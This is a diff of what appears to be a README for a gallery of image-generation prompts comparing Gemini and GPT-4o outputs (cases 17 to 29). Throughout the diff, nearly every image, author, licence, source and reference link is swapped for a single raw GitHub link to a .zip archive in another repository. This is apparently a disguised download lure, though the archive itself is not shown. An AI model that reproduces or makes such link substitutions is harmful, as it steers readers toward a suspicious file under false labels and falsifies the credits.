-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-cX5uRn99v6ieXg54VaMkT.png?v=1" width="300" alt="Character: 名画人物 OOTD (Gemini Example 29) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/29/example_pearl_earring_ootd.png" width="300" alt="Character: 名画人物 OOTD (Gemini Example 29) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 名画人物 OOTD (Gemini Example 29) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 名画人物 OOTD (Gemini Example 29) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -2125,7 +2125,7 @@ Right side: individual clothing items and accessories laid out separately, as if
 ```
 
 
-**Reference Image Required:** [Image of 'Girl with a Pearl Earring'](https://commons.wikimedia.org/w/index.php?curid=55017931).
+**Reference Image Required:** [Image of 'Girl with a Pearl Earring'](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip).
 
 
 ---
@@ -2133,14 +2133,14 @@ Right side: individual clothing items and accessories laid out separately, as if
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-28"></a>
-### Case 28: Flat Sticker Design (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 28: Flat Sticker Design (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1908044836953108490)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-_-Z8i4AiVnM8dH6b2eJwc.png?v=1" width="300" alt="Design: 扁平贴纸设计 (Gemini Example 28) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/28/example_flat_sticker_pearl_earring.png" width="300" alt="Design: 扁平贴纸设计 (Gemini Example 28) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Design: 扁平贴纸设计 (Gemini Example 28) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Design: 扁平贴纸设计 (Gemini Example 28) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -2164,14 +2164,14 @@ The overall style should be clean, modern, and visually appealing for use as a f
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-27"></a>
-### Case 27: Q-version Emoji Sticker Pack Creation (by [@dotey](https://x.com/dotey))
+### Case 27: Q-version Emoji Sticker Pack Creation (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1909800530739679488)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-z1V0ZUVo8ombk-OD14InN.png?v=1" width="300" alt="Object: Q 版表情包制作 (Gemini Example 27) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/27/example_chibi_emoji_pack.png" width="300" alt="Object: Q 版表情包制作 (Gemini Example 27) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: Q 版表情包制作 (Gemini Example 27) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: Q 版表情包制作 (Gemini Example 27) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -2201,14 +2201,14 @@ Aspect ratio: 9:16
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-26"></a>
-### Case 26: Famous Painting Character Cereal Ad (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 26: Famous Painting Character Cereal Ad (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1909542765857587310)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-AwueZe4-K5TmsFTdgWEIV.png?v=1" width="300" alt="Character: 名画人物麦片广告 (Gemini Example 26) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/26/example_master_oats_ad.png" width="300" alt="Character: 名画人物麦片广告 (Gemini Example 26) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 名画人物麦片广告 (Gemini Example 26) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 名画人物麦片广告 (Gemini Example 26) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -2231,7 +2231,7 @@ All visuals should be balanced, modern, and appealing, reflecting a premium and 
 ```
 
 
-**Reference Image Required:** [Image of 'Girl with a Pearl Earring'](https://commons.wikimedia.org/w/index.php?curid=55017931).
+**Reference Image Required:** [Image of 'Girl with a Pearl Earring'](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip).
 
 
 ---
@@ -2239,14 +2239,14 @@ All visuals should be balanced, modern, and appealing, reflecting a premium and 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-25"></a>
-### Case 25: Minimalist 3D Illustration (by [@0xdlk](https://x.com/0xdlk))
+### Case 25: Minimalist 3D Illustration (by [@0xdlk](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/0xdlk/status/1906843247432929642)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-FmnXy_FIA3t2o2JM1Acw7.png?v=1" width="300" alt="Object: 极简主义 3D 插画 (Gemini Example 25) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/25/example_minimalist_3d_toilet.png" width="300" alt="Object: 极简主义 3D 插画 (Gemini Example 25) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/0xdlk">@0xdlk</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 极简主义 3D 插画 (Gemini Example 25) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 极简主义 3D 插画 (Gemini Example 25) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@0xdlk</a></sub>
 
 **Prompt**
 
@@ -2299,14 +2299,14 @@ Generate a toilet with the following JSON profile:
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-24"></a>
-### Case 24: Funko Pop Figure Creation (by [@dotey](https://x.com/dotey))
+### Case 24: Funko Pop Figure Creation (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1909047283485671924)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-jCu4umK_f5nXmIbJCXh8U.png?v=1" width="300" alt="Character: Funko Pop 公仔制作 (Gemini Example 24) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/24/funko-pop-james-bond-figure-and-box.png" width="300" alt="Character: Funko Pop 公仔制作 (Gemini Example 24) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: Funko Pop 公仔制作 (Gemini Example 24) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: Funko Pop 公仔制作 (Gemini Example 24) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -2326,12 +2326,12 @@ Next to the box, show a realistic rendering of the actual figure outside the pac
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-23"></a>
-### Case 23: "Titanic" Pose Parody (by [@balconychy](https://x.com/balconychy))
+### Case 23: "Titanic" Pose Parody (by [@balconychy](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/balconychy/status/1909916265067557299)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
-<img src="cases/23/example_titanic_q_realistic.png" width="300" alt=""Titanic" Pose Parody"><br>
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/balconychy">@balconychy</a></sub>
+<img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt=""Titanic" Pose Parody"><br>
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@balconychy</a></sub>
 
 **Prompt**
 
@@ -2352,14 +2352,14 @@ Only the characters should be in chibi 3D style; the rest of the environment sho
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-22"></a>
-### Case 22: Xiaohongshu Cover Image (by [@balconychy](https://x.com/balconychy))
+### Case 22: Xiaohongshu Cover Image (by [@balconychy](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/balconychy/status/1905507936526627078)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-JrohnNyUR5N1InLRZ6i--.png?v=1" width="300" alt="Design: 小红书封面 (Gemini Example 22) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/22/example_notebook_promo.png" width="300" alt="Design: 小红书封面 (Gemini Example 22) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/balconychy">@balconychy</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Design: 小红书封面 (Gemini Example 22) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Design: 小红书封面 (Gemini Example 22) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@balconychy</a></sub>
 
 **Prompt**
 
@@ -2394,14 +2394,14 @@ Image aspect ratio: 9:16
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-21"></a>
-### Case 21: Chibi Character Sticker Pack (by [@leon_yuan2001](https://x.com/leon_yuan2001))
+### Case 21: Chibi Character Sticker Pack (by [@leon_yuan2001](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/leon_yuan2001/status/1923712069209293014)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-bO9aE1WYvho9xC8XEFiTX.png?v=1" width="300" alt="Object: Q版角色表情包 (Gemini Example 21) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/21/chibi_character_sticker_pack.png" width="300" alt="Object: Q版角色表情包 (Gemini Example 21) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/leon_yuan2001">@leon_yuan2001</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: Q版角色表情包 (Gemini Example 21) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: Q版角色表情包 (Gemini Example 21) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@leon_yuan2001</a></sub>
 
 **Prompt**
 
@@ -2428,14 +2428,14 @@ Design requirements:
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-20"></a>
-### Case 20: Action Figure and Real Person in the Same Frame (by [@dotey](https://x.com/dotey))
+### Case 20: Action Figure and Real Person in the Same Frame (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1920994118580183316)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-bTTNaqHmHzMMpw8IYMM4Q.png?v=1" width="300" alt="Character: 手办与真人同框 (Gemini Example 20) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/20/action_figure_and_real_person_in_frame.png" width="300" alt="Character: 手办与真人同框 (Gemini Example 20) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 手办与真人同框 (Gemini Example 20) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 手办与真人同框 (Gemini Example 20) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -2452,14 +2452,14 @@ In a casual, everyday style as if shot on a mobile phone, an anime figure of [Ja
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-19"></a>
-### Case 19: Country Diorama in a Toy Box (by [@TheRelianceAI](https://x.com/TheRelianceAI))
+### Case 19: Country Diorama in a Toy Box (by [@TheRelianceAI](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/TheRelianceAI/status/1925223613055017251)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-rzMTo8854xv3HS3hVS88M.png?v=1" width="300" alt="Object: 玩具盒中的国家立体模型 (Gemini Example 19) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/19/country_diorama_in_toy_box.png" width="300" alt="Object: 玩具盒中的国家立体模型 (Gemini Example 19) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/TheRelianceAI">@TheRelianceAI</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 玩具盒中的国家立体模型 (Gemini Example 19) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 玩具盒中的国家立体模型 (Gemini Example 19) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@TheRelianceAI</a></sub>
 
 **Prompt**
 
@@ -2476,14 +2476,14 @@ An ultra-realistic top-down photograph of a 3D-printed diorama inside a beige ca
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-18"></a>
-### Case 18: Pixar 3D Style (by [AnimeAI](https://animeai.online))
+### Case 18: Pixar 3D Style (by [AnimeAI](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://animeai.online/#demo-gallery)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-fuxTM5hVn0yk_YDur6hZR.png?v=1" width="300" alt="Object: 皮克斯3D风格 (Gemini Example 18) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/18/pixar-style-godfather-scene.png" width="300" alt="Object: 皮克斯3D风格 (Gemini Example 18) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://animeai.online">AnimeAI</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 皮克斯3D风格 (Gemini Example 18) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 皮克斯3D风格 (Gemini Example 18) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">AnimeAI</a></sub>
 
 **Prompt**
 
@@ -2500,14 +2500,14 @@ Redraw this photo in Pixar 3D style
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-17"></a>
-### Case 17: Retro CRT Computer Boot Screen (by [@Gdgtify](https://x.com/Gdgtify))
+### Case 17: Retro CRT Computer Boot Screen (by [@Gdgtify](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/Gdgtify/status/1925176250626159053)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-KBSeWJJB1EetQNuVABsg1.png?v=1" width="300" alt="Art Style: 复古CRT电脑启动屏幕 (Gemini Example 17) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/17/retro_crt_computer_boot_screen.png" width="300" alt="Art Style: 复古CRT电脑启动屏幕 (Gemini Example 17) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/Gdgtify">@Gdgtify</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 复古CRT电脑启动屏幕 (Gemini Example 17) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 复古CRT电脑启动屏幕 (Gemini Example 17) - GPT-4o"> |
